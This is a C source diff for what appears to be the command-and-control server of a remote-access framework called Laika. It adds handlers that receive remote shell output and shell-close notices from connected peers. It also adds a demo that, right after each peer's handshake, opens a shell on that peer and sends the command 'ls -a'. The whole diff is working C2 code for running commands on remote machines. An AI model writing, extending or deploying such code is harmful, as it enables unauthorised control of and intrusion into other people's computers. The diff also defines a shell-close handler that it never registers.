@@ -9,7 +9,26 @@
 LAIKAPKT_SIZE laikaC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
     [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_IPV4_LEN,
     [LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ] = sizeof(uint8_t),
+    [LAIKAPKT_SHELL_CLOSE] = sizeof(uint8_t)
 };
+
+void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+    uint8_t id = laikaS_readByte(&peer->sock);
+
+    printf("Shell %d for peer %lx was closed.\n", id, peer);
+}
+
+void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+    char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
+    uint8_t id;
+
+    if (sz < 1 || sz > LAIKA_SHELL_DATA_MAX_LENGTH)
+        LAIKA_ERROR("LAIKAPKT_SHELL_DATA malformed packet!")
+
+    id = laikaS_readByte(&peer->sock);
+    laikaS_read(&peer->sock, (void*)buf, sz-1);
+    write(STDOUT_FILENO, (void*)buf, sz-1);
+}
 
 void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     char magicBuf[LAIKA_MAGICLEN];
@@ -53,11 +72,23 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
     laikaC_onAddPeer(cnc, peer);
 
     LAIKA_DEBUG("accepted handshake from peer %lx\n", peer);
+
+    /* shell demo */
+    char *demo = "ls -a\n";
+    laikaS_startOutPacket(peer, LAIKAPKT_SHELL_OPEN);
+    laikaS_writeByte(&peer->sock, 0);
+    laikaS_endOutPacket(peer);
+
+    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
+    laikaS_writeByte(&peer->sock, 0);
+    laikaS_write(&peer->sock, demo, 6);
+    laikaS_endVarPacket(peer);
 }
 
 PeerPktHandler laikaC_handlerTbl[LAIKAPKT_MAXNONE] = {
     [LAIKAPKT_HANDSHAKE_REQ] = laikaC_handleHandshakeRequest,
     [LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ] = laikaC_handleAuthenticatedHandshake,
+    [LAIKAPKT_SHELL_DATA] = laikaC_handleShellData
 };
 
 struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
